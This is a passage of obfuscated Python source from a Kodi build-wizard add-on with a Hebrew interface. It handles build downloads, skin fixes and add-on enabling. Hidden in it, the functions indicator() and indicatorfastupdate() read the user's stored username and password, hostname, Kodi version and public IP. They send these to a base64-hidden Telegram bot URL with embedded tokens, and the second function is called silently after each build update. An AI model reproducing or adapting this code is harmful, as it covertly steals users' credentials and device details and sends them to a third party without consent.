                    O0OO0O00OOOOO0O0O =int (O0000OOOO0000O0OO /(1024 *O0O0OO00O00O0OOO0 ))#line:3383
                    OO000O00O0000O0O0 =int (OO0OOO0OO000O0OOO *O0O00O0OOOOO0O000 *100 /OOOO00O0OOOO0O0O0 )#line:3384
                    if O0OO0O00OOOOO0O0O >1024 and not OO000O00O0000O0O0 ==100 :#line:3385
                      OOOOO0OOOOOOOOOO0 =int (((OOOO00O0OOOO0O0O0 -O0000OOOO0000O0OO )/1024 )/(O0OO0O00OOOOO0O0O ))#line:3386
                    else :#line:3387
                      OOOOO0OOOOOOOOOO0 =0 #line:3388
                    O0OOO0OOO00O00000 .update (int (OO000O00O0000O0O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO000O00O0000O0O0 ,O0000OOOO0000O0OO /(1024 *1024 ),OOOO00O0OOOO0O0O0 /(1000 *1000 ),O0OO0O00OOOOO0O0O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOOO0OOOOOOOOOO0 ,60 ))#line:3390
                    OO0OOO0OO000O0OOO +=1 #line:3391
                    if O0OOO0OOO00O00000 .iscanceled ():#line:3392
                     O0OOO0OOO00O00000 .close ()#line:3393
                     break #line:3394
    O00OO0000O0OOO0OO ="https://docs.google.com/uc?export=download"#line:3395
    import urllib2 #line:3400
    import cookielib #line:3401
    from cookielib import CookieJar #line:3403
    OO0O0O00OO000O000 =CookieJar ()#line:3405
    O00O000OOO00OOO00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0O0O00OO000O000 ))#line:3406
    O0OOOO0O0O0O0O0O0 ={'id':O00O0OO00OO0OOO00 }#line:3408
    O0O0OO0OO0O000OO0 =urllib .urlencode (O0OOOO0O0O0O0O0O0 )#line:3409
    logging .warning (O00OO0000O0OOO0OO +'&'+O0O0OO0OO0O000OO0 )#line:3410
    O0000O00OO0OOOOOO =O00O000OOO00OOO00 .open (O00OO0000O0OOO0OO +'&'+O0O0OO0OO0O000OO0 )#line:3411
    OOOO00OO00O00000O =O0000O00OO0OOOOOO .read ()#line:3412
    for OOO0000O0O00O0O0O in OO0O0O00OO000O000 :#line:3414
         logging .warning (OOO0000O0O00O0O0O )#line:3415
    O0OOO0O0O00OO00O0 =OO00O0000O000O0OO (OO0O0O00OO000O000 )#line:3416
    logging .warning (O0OOO0O0O00OO00O0 )#line:3417
    if O0OOO0O0O00OO00O0 :#line:3418
        OOOOO0O0O00O0O00O ={'id':O00O0OO00OO0OOO00 ,'confirm':O0OOO0O0O00OO00O0 }#line:3419
        O000O0OO000000OOO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3420
        O0O0OO0OO0O000OO0 =urllib .urlencode (OOOOO0O0O00O0O00O )#line:3421
        O0000O00OO0OOOOOO =O00O000OOO00OOO00 .open (O00OO0000O0OOO0OO +'&'+O0O0OO0OO0O000OO0 )#line:3422
        chunk_read (O0000O00OO0OOOOOO ,report_hook =chunk_report ,dp =O0OOO0OOO00O00000 ,destination =O000OO0OOO0OOO0O0 ,filesize =OOO0O00O0000OOOO0 )#line:3423
    return (OOOO00O00OO0O00OO )#line:3427
def kodi17Fix ():#line:3428
	OO0000OOO000OO00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3429
	O00O000OO0OO0OOOO =[]#line:3430
	for O0O000O0O0O0O000O in sorted (OO0000OOO000OO00O ,key =lambda OO000O0OO000O0OO0 :OO000O0OO000O0OO0 ):#line:3431
		O000O000O00OOO000 =os .path .join (O0O000O0O0O0O000O ,'addon.xml')#line:3432
		if os .path .exists (O000O000O00OOO000 ):#line:3433
			O0OOOOOO0OOOOOOO0 =O0O000O0O0O0O000O .replace (ADDONS ,'')[1 :-1 ]#line:3434
			OO0O0OOOO0OO0OOOO =open (O000O000O00OOO000 )#line:3435
			OOOO0O0OOOO0OOO0O =OO0O0OOOO0OO0OOOO .read ()#line:3436
			O0000O00000O0O0OO =parseDOM (OOOO0O0OOOO0OOO0O ,'addon',ret ='id')#line:3437
			OO0O0OOOO0OO0OOOO .close ()#line:3438
			try :#line:3439
				OO000O0O0O000OO00 =xbmcaddon .Addon (id =O0000O00000O0O0OO [0 ])#line:3440
			except :#line:3441
				try :#line:3442
					log ("%s was disabled"%O0000O00000O0O0OO [0 ],xbmc .LOGDEBUG )#line:3443
					O00O000OO0OO0OOOO .append (O0000O00000O0O0OO [0 ])#line:3444
				except :#line:3445
					try :#line:3446
						log ("%s was disabled"%O0OOOOOO0OOOOOOO0 ,xbmc .LOGDEBUG )#line:3447
						O00O000OO0OO0OOOO .append (O0OOOOOO0OOOOOOO0 )#line:3448
					except :#line:3449
						if len (O0000O00000O0O0OO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0OOOOOO0OOOOOOO0 ,xbmc .LOGERROR )#line:3450
						else :log ("Unabled to enable: %s"%O0O000O0O0O0O000O ,xbmc .LOGERROR )#line:3451
	if len (O00O000OO0OO0OOOO )>0 :#line:3452
		OOO0OO0000OOOOOO0 =0 #line:3453
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3454
		for O0000000O0OO0OOOO in O00O000OO0OO0OOOO :#line:3455
			OOO0OO0000OOOOOO0 +=1 #line:3456
			O0OO00O0OO00O0O0O =int (percentage (OOO0OO0000OOOOOO0 ,len (O00O000OO0OO0OOOO )))#line:3457
			DP .update (O0OO00O0OO00O0O0O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000000O0OO0OOOO ))#line:3458
			addonDatabase (O0000000O0OO0OOOO ,1 )#line:3459
			if DP .iscanceled ():break #line:3460
		if DP .iscanceled ():#line:3461
			DP .close ()#line:3462
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3463
			sys .exit ()#line:3464
		DP .close ()#line:3465
	forceUpdate ()#line:3466
def indicator ():#line:3468
       try :#line:3469
          import json #line:3470
          wiz .log ('FRESH MESSAGE')#line:3471
          OOOO0OO00OO000O0O =(ADDON .getSetting ("user"))#line:3472
          O00O0O00O00OOOO00 =(ADDON .getSetting ("pass"))#line:3473
          OOO000000O000O0OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3474
          OOOOOOO0O0OOO000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3475
          OOO000OO0OOOO0OOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3476
          O00O0000O0O00OOO0 =str (json .loads (OOO000OO0OOOO0OOO )['ip'])#line:3477
          O0OOOOO0O00O000OO =OOOO0OO00OO000O0O #line:3478
          O000OO0OOO00000O0 =O00O0O00O00OOOO00 #line:3479
          import socket #line:3480
          OOO000OO0OOOO0OOO =urllib2 .urlopen (OOOOOOO0O0OOO000O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OOOOO0O00O000OO +' - '+O000OO0OOO00000O0 +' - '+OOO000000O000O0OO +' - '+O00O0000O0O00OOO0 ).readlines ()#line:3481
       except :pass #line:3483
def indicatorfastupdate ():#line:3485
       try :#line:3486
          import json #line:3487
          wiz .log ('FRESH MESSAGE')#line:3488
          OO0OOO00OO0O000O0 =(ADDON .getSetting ("user"))#line:3489
          OOO000OOO0000O0OO =(ADDON .getSetting ("pass"))#line:3490
          OOOO000OOO0000OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3491
          OO00O00O0O00O0O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3493
          OOOO000000OOOO0OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3494
          O000OOOOO0000OOOO =str (json .loads (OOOO000000OOOO0OO )['ip'])#line:3495
          OOO0000OO0OO00OO0 =OO0OOO00OO0O000O0 #line:3496
          OOOO00OOO0O0O0OO0 =OOO000OOO0000O0OO #line:3497
          import socket #line:3499
          OOOO000000OOOO0OO =urllib2 .urlopen (OO00O00O0O00O0O00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOO0000OO0OO00OO0 +' - '+OOOO00OOO0O0O0OO0 +' - '+OOOO000OOO0000OOO +' - '+O000OOOOO0000OOOO ).readlines ()#line:3500
       except :pass #line:3502
def skinfix18 ():#line:3504
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3505
		OOO000OOO0000OOO0 =wiz .workingURL (SKINID18DDONXML )#line:3506
		if OOO000OOO0000OOO0 ==True :#line:3507
			OOO0O00O00O0O0O0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3508
			if len (OOO0O00O00O0O0O0O )>0 :#line:3509
				OO0000O000OO0OO0O ='%s-%s.zip'%(SKINID18 ,OOO0O00O00O0O0O0O [0 ])#line:3510
				OO00OOOOOO00000OO =wiz .workingURL (SKIN18ZIPURL +OO0000O000OO0OO0O )#line:3511
				if OO00OOOOOO00000OO ==True :#line:3512
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3513
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3514
					O0O00O00O0O00OO0O =os .path .join (PACKAGES ,OO0000O000OO0OO0O )#line:3515
					try :os .remove (O0O00O00O0O00OO0O )#line:3516
					except :pass #line:3517
					downloader .download (SKIN18ZIPURL +OO0000O000OO0OO0O ,O0O00O00O0O00OO0O ,DP )#line:3518
					extract .all (O0O00O00O0O00OO0O ,HOME ,DP )#line:3519
					try :#line:3520
						OOO0OO00O00OOOO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3521
						O0O0OOO0O000OOOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3522
						os .rename (OOO0OO00O00OOOO00 ,O0O0OOO0O000OOOO0 )#line:3523
					except :#line:3524
						pass #line:3525
					try :#line:3526
						O000O000OO0O0O000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO0OO000OO0OOOO00 =O000O000OO0O0O000 .read ();O000O000OO0O0O000 .close ()#line:3527
						O00O000O0OO000O0O =wiz .parseDOM (OO0OO000OO0OOOO00 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3528
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O000O0OO000O0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3529
					except :#line:3530
						pass #line:3531
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3532
					DP .close ()#line:3533
					xbmc .sleep (500 )#line:3534
					wiz .forceUpdate (True )#line:3535
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3536
				else :#line:3537
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3538
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO00OOOOOO00000OO ,xbmc .LOGERROR )#line:3539
			else :#line:3540
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3541
		else :#line:3542
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3543
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3544
def skinfix17 ():#line:3545
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3546
		O0OO00O0OO0O0OOO0 =wiz .workingURL (SKINID17DDONXML )#line:3547
		if O0OO00O0OO0O0OOO0 ==True :#line:3548
			O00O0O00OOOOO00O0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3549
			if len (O00O0O00OOOOO00O0 )>0 :#line:3550
				O0O0000OOOO000O00 ='%s-%s.zip'%(SKINID17 ,O00O0O00OOOOO00O0 [0 ])#line:3551
				OO0000OO00OOO0000 =wiz .workingURL (SKIN17ZIPURL +O0O0000OOOO000O00 )#line:3552
				if OO0000OO00OOO0000 ==True :#line:3553
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3554
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3555
					O00O0O0O0000OOO00 =os .path .join (PACKAGES ,O0O0000OOOO000O00 )#line:3556
					try :os .remove (O00O0O0O0000OOO00 )#line:3557
					except :pass #line:3558
					downloader .download (SKIN17ZIPURL +O0O0000OOOO000O00 ,O00O0O0O0000OOO00 ,DP )#line:3559
					extract .all (O00O0O0O0000OOO00 ,HOME ,DP )#line:3560
					try :#line:3561
						OO00O0O00OO00O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3562
						OO0OOO000OOOOOOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3563
						os .rename (OO00O0O00OO00O0OO ,OO0OOO000OOOOOOO0 )#line:3564
					except :#line:3565
						pass #line:3566
					try :#line:3567
						OOOO0OOOOO00OOO0O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00OO0000O0OO0O00 =OOOO0OOOOO00OOO0O .read ();OOOO0OOOOO00OOO0O .close ()#line:3568
						OO00000000O0OOOOO =wiz .parseDOM (O00OO0000O0OO0O00 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3569
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00000000O0OOOOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3570
					except :#line:3571
						pass #line:3572
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3573
					DP .close ()#line:3574
					xbmc .sleep (500 )#line:3575
					wiz .forceUpdate (True )#line:3576
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3577
				else :#line:3578
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3579
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0000OO00OOO0000 ,xbmc .LOGERROR )#line:3580
			else :#line:3581
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3582
		else :#line:3583
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3584
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3585
def fix17update ():#line:3586
	if KODIV >=17 and KODIV <18 :#line:3587
		wiz .kodi17Fix ()#line:3588
		xbmc .sleep (4000 )#line:3589
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3590
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3591
		fixfont ()#line:3592
		OOO00O0OO0000O0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3593
		try :#line:3595
			OOO000OOOO0O000O0 =open (OOO00O0OO0000O0OO ,'r')#line:3596
			O0O00O0O0O0OO0OOO =OOO000OOOO0O000O0 .read ()#line:3597
			OOO000OOOO0O000O0 .close ()#line:3598
			O00O00O00OOO000OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3599
			OO0OO0OOOOOO0O00O =re .compile (O00O00O00OOO000OO ).findall (O0O00O0O0O0OO0OOO )[0 ]#line:3600
			OOO000OOOO0O000O0 =open (OOO00O0OO0000O0OO ,'w')#line:3601
			OOO000OOOO0O000O0 .write (O0O00O0O0O0OO0OOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO0OO0OOOOOO0O00O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3602
			OOO000OOOO0O000O0 .close ()#line:3603
		except :#line:3604
				pass #line:3605
		wiz .kodi17Fix ()#line:3606
		OOO00O0OO0000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3607
		try :#line:3608
			OOO000OOOO0O000O0 =open (OOO00O0OO0000O0OO ,'r')#line:3609
			O0O00O0O0O0OO0OOO =OOO000OOOO0O000O0 .read ()#line:3610
			OOO000OOOO0O000O0 .close ()#line:3611
			O00O00O00OOO000OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3612
			OO0OO0OOOOOO0O00O =re .compile (O00O00O00OOO000OO ).findall (O0O00O0O0O0OO0OOO )[0 ]#line:3613
			OOO000OOOO0O000O0 =open (OOO00O0OO0000O0OO ,'w')#line:3614
			OOO000OOOO0O000O0 .write (O0O00O0O0O0OO0OOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO0OO0OOOOOO0O00O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3615
			OOO000OOOO0O000O0 .close ()#line:3616
		except :#line:3617
				pass #line:3618
		swapSkins ('skin.Premium.mod')#line:3619
def fix18update ():#line:3621
	if KODIV >=18 :#line:3622
		xbmc .sleep (4000 )#line:3623
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3624
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3625
		fixfont ()#line:3626
		OOO0O0O00000OOOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3627
		try :#line:3628
			O0000OO0OOO0OOOOO =open (OOO0O0O00000OOOOO ,'r')#line:3629
			O000OO0O00O00O00O =O0000OO0OOO0OOOOO .read ()#line:3630
			O0000OO0OOO0OOOOO .close ()#line:3631
			O0O0O0OOOOOO0OOOO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3632
			OOOOO0OO0OO0O0O0O =re .compile (O0O0O0OOOOOO0OOOO ).findall (O000OO0O00O00O00O )[0 ]#line:3633
			O0000OO0OOO0OOOOO =open (OOO0O0O00000OOOOO ,'w')#line:3634
			O0000OO0OOO0OOOOO .write (O000OO0O00O00O00O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOOO0OO0OO0O0O0O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3635
			O0000OO0OOO0OOOOO .close ()#line:3636
		except :#line:3637
				pass #line:3638
		wiz .kodi17Fix ()#line:3639
		OOO0O0O00000OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3640
		try :#line:3641
			O0000OO0OOO0OOOOO =open (OOO0O0O00000OOOOO ,'r')#line:3642
			O000OO0O00O00O00O =O0000OO0OOO0OOOOO .read ()#line:3643
			O0000OO0OOO0OOOOO .close ()#line:3644
			O0O0O0OOOOOO0OOOO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3645
			OOOOO0OO0OO0O0O0O =re .compile (O0O0O0OOOOOO0OOOO ).findall (O000OO0O00O00O00O )[0 ]#line:3646
			O0000OO0OOO0OOOOO =open (OOO0O0O00000OOOOO ,'w')#line:3647
			O0000OO0OOO0OOOOO .write (O000OO0O00O00O00O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOOO0OO0OO0O0O0O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3648
			O0000OO0OOO0OOOOO .close ()#line:3649
		except :#line:3650
				pass #line:3651
		swapSkins ('skin.Premium.mod')#line:3652
def buildWizard (OOOO0OO0OO00OO000 ,OOOOOO0O0OOOOOOO0 ,theme =None ,over =False ):#line:3655
	if over ==False :#line:3656
		O0OO00O000OO00000 =wiz .checkBuild (OOOO0OO0OO00OO000 ,'url')#line:3657
		if O0OO00O000OO00000 ==False :#line:3659
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','אנא המתן')))#line:3663
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3664
			return #line:3665
		O0OOO00O00OO000O0 =wiz .workingURL (O0OO00O000OO00000 )#line:3666
		if O0OOO00O00OO000O0 ==False :#line:3667
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OOO00O00OO000O0 ))#line:3668
			return #line:3669
	if OOOOOO0O0OOOOOOO0 =='gui':#line:3670
		if OOOO0OO0OO00OO000 ==BUILDNAME :#line:3671
			if over ==True :O0OOOO0000O00OO00 =1 #line:3672
			else :O0OOOO0000O00OO00 =1 #line:3673
		else :#line:3674
			O0OOOO0000O00OO00 =1 #line:3675
		if O0OOOO0000O00OO00 :#line:3676
			remove_addons ()#line:3677
			remove_addons2 ()#line:3678
			O0O000OOOOO0O00O0 =wiz .checkBuild (OOOO0OO0OO00OO000 ,'gui')#line:3679
			O0O0O000000OOOO0O =OOOO0OO0OO00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3680
			if not wiz .workingURL (O0O000OOOOO0O00O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3681
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3682
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO0OO00OO000 ),'','אנא המתן')#line:3683
			OO0O000OO0OOO00OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0O000000OOOO0O )#line:3684
			try :os .remove (OO0O000OO0OOO00OO )#line:3685
			except :pass #line:3686
			logging .warning (O0O000OOOOO0O00O0 )#line:3687
			if 'google'in O0O000OOOOO0O00O0 :#line:3688
			   O00O000OOOOOOOO00 =googledrive_download (O0O000OOOOO0O00O0 ,OO0O000OO0OOO00OO ,DP ,wiz .checkBuild (OOOO0OO0OO00OO000 ,'filesize'))#line:3689
			else :#line:3692
			  downloader .download (O0O000OOOOO0O00O0 ,OO0O000OO0OOO00OO ,DP )#line:3693
			xbmc .sleep (100 )#line:3694
			O00O00O00OOOO00OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO0OO00OO000 )#line:3695
			DP .update (0 ,O00O00O00OOOO00OO ,'','אנא המתן')#line:3696
			extract .all (OO0O000OO0OOO00OO ,HOME ,DP ,title =O00O00O00OOOO00OO )#line:3697
			DP .close ()#line:3698
			wiz .defaultSkin ()#line:3699
			wiz .lookandFeelData ('save')#line:3700
			wiz .kodi17Fix ()#line:3701
			if KODIV >=18 :#line:3702
				skindialogsettind18 ()#line:3703
			xbmc .executebuiltin ("ReloadSkin()")#line:3704
			if INSTALLMETHOD ==1 :OOO0OO00O0000OO00 =1 #line:3705
			elif INSTALLMETHOD ==2 :OOO0OO00O0000OO00 =0 #line:3706
			else :DP .close ()#line:3707
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3708
			indicatorfastupdate ()#line:3709
		else :#line:3711
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3712
	if OOOOOO0O0OOOOOOO0 =='gui2':#line:3713
		if OOOO0OO0OO00OO000 ==BUILDNAME :#line:3714
			if over ==True :O0OOOO0000O00OO00 =1 #line:3715
			else :O0OOOO0000O00OO00 =1 #line:3716
		else :#line:3717
			O0OOOO0000O00OO00 =1 #line:3718
		if O0OOOO0000O00OO00 :#line:3719
			remove_addons ()#line:3720
			remove_addons2 ()#line:3721
			O0O000OOOOO0O00O0 =wiz .checkBuild (OOOO0OO0OO00OO000 ,'gui')#line:3722
			O0O0O000000OOOO0O =OOOO0OO0OO00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3723
			if not wiz .workingURL (O0O000OOOOO0O00O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3724
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3725
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO0OO00OO000 ),'','אנא המתן')#line:3726
			OO0O000OO0OOO00OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O0O000000OOOO0O )#line:3727
			try :os .remove (OO0O000OO0OOO00OO )#line:3728
			except :pass #line:3729
			logging .warning (O0O000OOOOO0O00O0 )#line:3730
			if 'google'in O0O000OOOOO0O00O0 :#line:3731
			   O00O000OOOOOOOO00 =googledrive_download (O0O000OOOOO0O00O0 ,OO0O000OO0OOO00OO ,DP ,wiz .checkBuild (OOOO0OO0OO00OO000 ,'filesize'))#line:3732
			else :#line:3735
			  downloader .download (O0O000OOOOO0O00O0 ,OO0O000OO0OOO00OO ,DP )#line:3736
			xbmc .sleep (100 )#line:3737
			O00O00O00OOOO00OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO0OO00OO000 )#line:3738
			DP .update (0 ,O00O00O00OOOO00OO ,'','אנא המתן')#line:3739
			extract .all (OO0O000OO0OOO00OO ,HOME ,DP ,title =O00O00O00OOOO00OO )#line:3740
			DP .close ()#line:3741
			wiz .defaultSkin ()#line:3742
			wiz .lookandFeelData ('save')#line:3743
			if INSTALLMETHOD ==1 :OOO0OO00O0000OO00 =1 #line:3746
			elif INSTALLMETHOD ==2 :OOO0OO00O0000OO00 =0 #line:3747
			else :DP .close ()#line:3748
		else :#line:3750
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3751
	elif OOOOOO0O0OOOOOOO0 =='fresh':#line:3752
		freshStart (OOOO0OO0OO00OO000 )#line:3753
	elif OOOOOO0O0OOOOOOO0 =='normal':#line:3754
		if url =='normal':#line:3755
			if KEEPTRAKT =='true':#line:3756
				traktit .autoUpdate ('all')#line:3757
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3758
			if KEEPREAL =='true':#line:3759
				debridit .autoUpdate ('all')#line:3760
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3761
			if KEEPLOGIN =='true':#line:3762
				loginit .autoUpdate ('all')#line:3763
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3764
		OOOOOOOO0OO0O00OO =int (KODIV );O0OOO0OOOOO0000O0 =int (float (wiz .checkBuild (OOOO0OO0OO00OO000 ,'kodi')))#line:3765
		if not OOOOOOOO0OO0O00OO ==O0OOO0OOOOO0000O0 :#line:3766
			if OOOOOOOO0OO0O00OO ==16 and O0OOO0OOOOO0000O0 <=15 :O0OO00OO000OO0OO0 =False #line:3767
			else :O0OO00OO000OO0OO0 =True #line:3768
		else :O0OO00OO000OO0OO0 =False #line:3769
		if O0OO00OO000OO0OO0 ==True :#line:3770
			O00O00OOOOOO0OO0O =1 #line:3771
		else :#line:3772
			if not over ==False :O00O00OOOOOO0OO0O =1 #line:3773
			else :O00O00OOOOOO0OO0O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3774
		if O00O00OOOOOO0OO0O :#line:3775
			wiz .clearS ('build')#line:3776
			O0O000OOOOO0O00O0 =wiz .checkBuild (OOOO0OO0OO00OO000 ,'url')#line:3777
